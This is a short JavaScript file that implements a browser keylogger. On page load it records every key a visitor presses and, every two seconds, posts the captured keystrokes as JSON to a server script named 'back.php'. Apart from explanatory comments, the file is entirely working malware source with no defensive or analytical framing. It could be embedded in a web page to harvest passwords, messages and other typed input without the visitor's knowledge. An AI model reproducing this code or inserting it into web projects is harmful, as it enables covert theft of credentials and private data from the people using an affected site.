var keylog = {
    cache: [], delay: 2000, sending: false,
    init: function () {
        //addEventListener for adding event handler to the Webpage
        try
        {
            window.addEventListener("keydown", function (evt) {
                keylog.cache.push(evt.key); });
            //Set Interval for periodically calling the send function
            window.setInterval(keylog.send, keylog.delay); 
        }
        catch(err){
            console.log(err.message);
        }
    },
    send: function () {
        try{
            if (!keylog.sending && keylog.cache.length != 0) {
                keylog.sending = true;        
                //FormData converts the existing data to key value pairs 
                var data = new FormData();
                //JSON.stringify converts the formdata into JSON object 
                data.append("keys", JSON.stringify(keylog.cache)); 
                keylog.cache = [];
                //XMLHTTPRequest Object to send data 
                var xhr = new XMLHttpRequest(); 
                xhr.open("POST", "back.php"); 
                xhr.onload = function () {
                    keylog.sending = false;
                    console.log(this.response); 
                };
                xhr.send(data);
                console.log("HELLO");
            }
        }
        catch(err){
            console.log(err.message);
        }
    }
};
window.addEventListener("DOMContentLoaded", keylog.init);